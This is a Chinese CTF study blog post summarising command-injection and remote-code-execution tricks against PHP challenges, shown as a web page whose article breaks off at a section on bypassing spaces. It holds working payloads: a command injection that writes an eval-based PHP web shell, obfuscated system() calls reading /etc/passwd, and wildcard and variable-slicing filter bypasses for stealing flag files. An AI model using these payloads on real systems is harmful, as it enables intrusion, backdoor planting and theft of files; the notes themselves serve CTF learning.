<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
<meta name="generator" content="Hexo 6.0.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
<meta name="description" content="0x01 基础命令符号类123456789#①转义字符windows中^linux中\#②多条命令执行连接的符号windows中&amp;&amp; || %0a;linux下 &amp;&amp; || ; $() &#96;&#96; %0a  %0d#③注释字符windows下::linux下#  0x02 常见的命令类读取文件的命令 12345678910#读取文件highlight_file(&amp;quot">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF命令执行总结">
<meta property="og:url" content="http://example.com/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="Echo">
<meta property="og:description" content="0x01 基础命令符号类123456789#①转义字符windows中^linux中\#②多条命令执行连接的符号windows中&amp;&amp; || %0a;linux下 &amp;&amp; || ; $() &#96;&#96; %0a  %0d#③注释字符windows下::linux下#  0x02 常见的命令类读取文件的命令 12345678910#读取文件highlight_file(&amp;quot">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220226231322115.png">
<meta property="og:image" content="http://example.com/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220226232717445.png">
<meta property="og:image" content="http://example.com/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220226234043869.png">
<meta property="og:image" content="http://example.com/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220124140605804.png">
<meta property="og:image" content="http://example.com/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220124144510476.png">
<meta property="og:image" content="http://example.com/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220220163455540.png">
<meta property="article:published_time" content="2022-02-26T14:57:00.000Z">
<meta property="article:modified_time" content="2022-02-26T15:47:47.340Z">
<meta property="article:author" content="CJ">
<meta property="article:tag" content="STUDY">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220226231322115.png">


<link rel="canonical" href="http://example.com/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/","path":"2022/02/26/CTF命令执行总结/","title":"CTF命令执行总结"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>CTF命令执行总结 | Echo</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Echo</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">CJ'S BLOG</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E7%AC%A6%E5%8F%B7%E7%B1%BB"><span class="nav-number">1.</span> <span class="nav-text">0x01 基础命令符号类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%B8%B8%E8%A7%81%E7%9A%84%E5%91%BD%E4%BB%A4%E7%B1%BB"><span class="nav-number">2.</span> <span class="nav-text">0x02 常见的命令类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%878%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="nav-number">3.</span> <span class="nav-text">0x03 常见绕过8种方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%89%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce"><span class="nav-number">3.1.</span> <span class="nav-text">有字母数字rce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B2%A1%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE"><span class="nav-number">3.2.</span> <span class="nav-text">没字母数字RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="nav-number">3.3.</span> <span class="nav-text">无参数RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8%E7%B1%BB"><span class="nav-number">4.</span> <span class="nav-text">0x04 综合利用类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E7%BB%95%E8%BF%87"><span class="nav-number">4.1.</span> <span class="nav-text">命令执行无回显绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF%EF%BC%9A"><span class="nav-number">5.</span> <span class="nav-text">其他姿势：</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CJ</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">23</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/cjtyx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cjtyx" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:2081297822@qq.com" title="E-Mail → mailto:2081297822@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CTF命令执行总结
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-02-26 22:57:00 / Modified: 23:47:47" itemprop="dateCreated datePublished" datetime="2022-02-26T22:57:00+08:00">2022-02-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>11k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>10 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h2 id="0x01-基础命令符号类"><a href="#0x01-基础命令符号类" class="headerlink" title="0x01 基础命令符号类"></a>0x01 基础命令符号类</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#①转义字符</span></span><br><span class="line">windows中^</span><br><span class="line">linux中\</span><br><span class="line"><span class="comment">#②多条命令执行连接的符号</span></span><br><span class="line">windows中&amp;&amp; || %0a;</span><br><span class="line">linux下 &amp;&amp; || ; $() <span class="string">``</span> %0a  %0d</span><br><span class="line"><span class="comment">#③注释字符</span></span><br><span class="line">windows下::</span><br><span class="line">linux下<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x02-常见的命令类"><a href="#0x02-常见的命令类" class="headerlink" title="0x02 常见的命令类"></a>0x02 常见的命令类</h2><p>读取文件的命令</p>
<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#读取文件</span></span><br><span class="line">highlight_file(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">show_source()  file_get_contents</span><br><span class="line"><span class="meta">#glob() 函数返回匹配指定模式的文件名或目录。</span></span><br><span class="line"><span class="meta">#举个例子:</span></span><br><span class="line">glob(<span class="string">&quot;*&quot;</span>) 匹配任意文件</span><br><span class="line">glob(<span class="string">&quot;*.txt&quot;</span>)匹配以txt为后缀的文件</span><br><span class="line"><span class="meta">#打印文件的命令</span></span><br><span class="line">print_r();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>找文件命令,如找flag.txt文件方法</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">find</span> / -name flag.txt</span><br><span class="line"><span class="builtin-name">find</span> / -name *.txt #查找所有txt文件方法</span><br><span class="line"><span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span>看看有s属性文件</span><br><span class="line"><span class="comment">#或者find / -name f&#123;l,m&#125;ag.txt/进行通配出字符</span></span><br><span class="line"><span class="comment">#结合grep命令一起使用</span></span><br><span class="line"><span class="builtin-name">find</span> / -name <span class="string">&quot;*.txt&quot;</span> |xargs grep <span class="string">&quot;www.dutycode.com&quot;</span></span><br><span class="line"><span class="comment">#不知道为什么会出现</span></span><br><span class="line">paths must precede expression: 类型的问题</span><br></pre></td></tr></table></figure>

<p>查看linux内核版本命令</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -<span class="keyword">a</span></span><br><span class="line">dir d:\ <span class="comment">#列出目录类</span></span><br></pre></td></tr></table></figure>

<p>unix中常见命令</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ll 列目录、文件（相当于Windows下dir)</span><br><span class="line">pwd 查看当前绝对路径</span><br><span class="line">wget 下载指定的url文件</span><br><span class="line">cat <span class="regexp">/proc/</span><span class="number">1</span>/cgroup 查看是否处在docker虚拟机中</span><br><span class="line"><span class="comment">#如果无ifconfig和无IP命令的话,可以利用proc文件方式查看</span></span><br><span class="line">cat <span class="regexp">/proc/</span>net/fib_trie</span><br><span class="line">cat <span class="regexp">/etc/</span>sysconfig/network</span><br></pre></td></tr></table></figure>

<p>eval–&gt;可计算某个字符串,并执行其中的的 JavaScript 代码<br> 典型构造是执行代码</p>
<p>1.利用system执行的典型方法</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span> $cmd</span><br><span class="line"><span class="comment">#即构造</span></span><br><span class="line">cmd=<span class="keyword">system</span>(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line"><span class="comment">#即列出这个文件的相关内容</span></span><br><span class="line"><span class="keyword">system</span>(“ls -al /etc/passwd /etc/shadow”);</span><br><span class="line">cmd=<span class="keyword">system</span>(<span class="string">&quot;cat flag_1171&quot;</span>);</span><br><span class="line"><span class="comment">#骚思路</span></span><br><span class="line"><span class="comment">#绕过</span></span><br><span class="line">c=<span class="keyword">system</span>(<span class="string">&#x27;cat f*&#x27;</span>);</span><br><span class="line"><span class="comment">#--&gt;即代通配符方法读取思路</span></span><br><span class="line"><span class="keyword">system</span>(<span class="string">&quot;cat /etc/passwd&quot;</span>)</span><br><span class="line">&lt;=&gt;</span><br><span class="line"><span class="string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(<span class="string">&quot;cat /etc/passwd&quot;</span>);</span><br><span class="line">&lt;=&gt;</span><br><span class="line">(sy.(st).em)(<span class="string">&quot;cat /etc/passwd&quot;</span>);</span><br><span class="line">&lt;=&gt;还可以用注释方法绕过</span><br><span class="line"><span class="string">&quot;system/*fthgb666*/(&quot;</span>cat /etc/passwd);<span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;=&gt;</span></span><br><span class="line"><span class="string">&quot;</span><span class="keyword">system</span>/*fthgb666*<span class="regexp">/(wh./</span>*fthgb666*<span class="regexp">/(oa)/</span>*fthgb666*<span class="regexp">/.mi);&quot;</span></span><br><span class="line"><span class="regexp">&lt;=&gt;</span></span><br><span class="line"><span class="regexp">&quot;(sy./</span>*fthgb666*<span class="regexp">/(st)/</span>*fthgb666*<span class="regexp">/.em)/</span>*fthgb666*<span class="regexp">/(wh./</span>*fthgb666*<span class="regexp">/(oa)/</span>*fthgb666*/.mi);<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">命令执行函数</span><br><span class="line"><span class="function"><span class="title">system</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">passthru</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">shell_exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">popen</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">proc_open</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">pcntl_exec</span><span class="params">()</span></span></span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220226231322115.png" alt="image-20220226231322115"></p>
<p>2.写一句话木马,利用echo代写一句话马</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">127.0.0.1 &amp; echo &quot;</span><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(@@\<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="xml">&quot; &gt; 3.php</span></span><br></pre></td></tr></table></figure>

<p><strong>base64的使用</strong></p>
<p>bin为binary的简写主要放置一些 <a target="_blank" rel="noopener" href="http://www.2cto.com/os/">系统</a>的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64,bzip2等</p>
<p>这里我们可以利用 base64 中的64 进行通配符匹配  即 /bin/base64 flag.php</p>
<p><strong>bzip2的使用</strong></p>
<p>bzip2是linux下面的压缩文件的命令<br>我们可以通过该命令压缩flag.php 然后进行下载<br>payload：?c=/???/???/????2 ????.???    ?c=/???/????2 ????.???<br>也就是/usr/bin/bzip2 flag.php<br>然后访问/flag.php.bz2进行下载获得flag.php</p>
<h2 id="0x03-常见绕过8种方法"><a href="#0x03-常见绕过8种方法" class="headerlink" title="0x03 常见绕过8种方法"></a>0x03 常见绕过8种方法</h2><h3 id="有字母数字rce"><a href="#有字母数字rce" class="headerlink" title="有字母数字rce"></a>有字母数字rce</h3><p>1)命令拼接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=who</span><br><span class="line">b=ami</span><br><span class="line">$a<span class="variable">$b</span> //输出whoami</span><br></pre></td></tr></table></figure>

<p>2)常用字符使用–&gt;常用符号</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&amp;            表示将任务置于后台执行</span><br><span class="line">;            多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</span><br><span class="line">&amp;&amp;           只有在 &amp;&amp; 左边的命令返回真<span class="comment">(命令返回值 $? == 0)</span>,&amp;&amp;右边的命令才会被执行。</span><br><span class="line">||           只有在 || 左边的命令返回假<span class="comment">(命令返回值 $? == 1)</span>,||右边的命令才会被执行。</span><br><span class="line"><span class="meta">%</span><span class="number">0</span>a          </span><br><span class="line"><span class="meta">%</span><span class="number">0</span>d            </span><br><span class="line">| <span class="comment">(管道符)</span>     |表示管道，上一条命令的输出，作为下一条命令的参数</span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo qwe ; ls           <span class="regexp">//</span>会先输出字符qwe,然后执行ls</span><br><span class="line">q=l; w=s; e=<span class="string">&quot; -al&quot;</span>; <span class="variable">$q</span><span class="variable">$w</span><span class="variable">$e</span>   <span class="regexp">//</span>执行ls -al命令</span><br><span class="line">qwe | ls                <span class="regexp">//</span>执行后面的命令,前面的不执行</span><br><span class="line"><span class="comment">#最常用;和|符号</span></span><br></pre></td></tr></table></figure>

<p>3)linux中默认的字符命令</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;PATH:<span class="number">5</span>:<span class="number">1</span>&#125;    <span class="comment">#l</span></span><br><span class="line"><span class="variable">$</span>&#123;PATH:<span class="number">2</span>:<span class="number">1</span>&#125;    <span class="comment">#s</span></span><br><span class="line"><span class="variable">$</span>&#123;PATH:<span class="number">5</span>:<span class="number">1</span>&#125;<span class="variable">$</span>&#123;PATH:<span class="number">2</span>:<span class="number">1</span>&#125; <span class="comment">#拼接后是ls,执行命令</span></span><br><span class="line"><span class="variable">$</span>&#123;PATH:<span class="number">5</span>:<span class="number">1</span>&#125;s           <span class="comment">#拼接后是ls,执行命令</span></span><br><span class="line"><span class="comment">#即直接这个命令即可完事</span></span><br><span class="line"><span class="variable">$</span>&#123;SHLVL&#125;       //一般是一个个位数</span><br><span class="line"><span class="variable">$</span>&#123;<span class="comment">#SHLVL&#125;     //1，表示结果的字符长度</span></span><br><span class="line"><span class="variable">$</span>&#123;<span class="built_in">PWD</span>:<span class="variable">$</span>&#123;<span class="comment">#&#125;:$&#123;#SHLVL&#125;&#125;       //表示/</span></span><br><span class="line"><span class="variable">$</span>&#123;USER&#125;        //www<span class="literal">-data</span>   <span class="number">99</span>%默认是这个</span><br><span class="line"><span class="variable">$</span>&#123;PHP_VERSION:~A&#125;       //<span class="number">2</span></span><br><span class="line"><span class="variable">$</span>&#123;USER:~<span class="variable">$</span>&#123;PHP_VERSION:~A&#125;:<span class="variable">$</span>&#123;PHP_VERSION:~A&#125;&#125;         //at</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="built_in">PWD</span>:<span class="number">0</span>:<span class="number">1</span>&#125;</span><br><span class="line">获取变量<span class="built_in">PWD</span>的第一个字符</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="built_in">PWD</span>::<span class="number">1</span>&#125;</span><br><span class="line">可以为空。为空的部分就当作<span class="number">0</span>了</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="built_in">PWD</span><span class="comment">#??????&#125;</span></span><br><span class="line"><span class="variable">$</span>&#123;变量<span class="comment">#字符串&#125;表示在变量中。截取字符串右边的值。可以用模糊匹配。截取PWD的最后一位</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="built_in">PWD</span>%??????&#125;</span><br><span class="line"><span class="variable">$</span>&#123;变量%字符串&#125;表示在变量中。截取字符串左边的值。可以用模糊匹配。截取<span class="built_in">PWD</span>的第一位</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="comment">#PWD&#125;</span></span><br><span class="line">获取变量<span class="built_in">PWD</span>的长度</span><br><span class="line">AASAA;<span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="comment">#_&#125;</span></span><br><span class="line"><span class="variable">$_</span>。表示上一个命令的返回结果。这样就可以构造任意数字</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="comment">#A&#125;</span></span><br><span class="line">由于变量A没定义。所以他的长度为<span class="number">0</span>.</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$OPTIND</span></span><br><span class="line">这个也可以获取数字<span class="number">1</span></span><br><span class="line">&gt;B;<span class="built_in">echo</span> <span class="variable">$</span>?</span><br><span class="line">最后运行的命令的结束代码,可以获得数字<span class="number">0</span></span><br><span class="line">&lt;B;<span class="built_in">echo</span> <span class="variable">$</span>?</span><br><span class="line">最后运行的命令的结束代码,可以获得数字<span class="number">1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$RANDOM</span></span><br><span class="line">可以生成随机数。可以配合<span class="comment">#构造6543这几种数字。概率比较大。还可以配合截取。获得数字</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="comment">#$&#125;</span></span><br><span class="line"><span class="variable">$</span><span class="variable">$</span>是程序PID。<span class="comment">#获取长度。看运气咯</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="comment">#SHLVL&#125;</span></span><br><span class="line">SHLVL貌似是一个shell终端深度。。然后<span class="comment">#可以获取数字1</span></span><br><span class="line"><span class="variable">$</span>&#123;USER&#125;        //www<span class="literal">-data</span></span><br></pre></td></tr></table></figure>

<p>4）绕–&gt;空格</p>
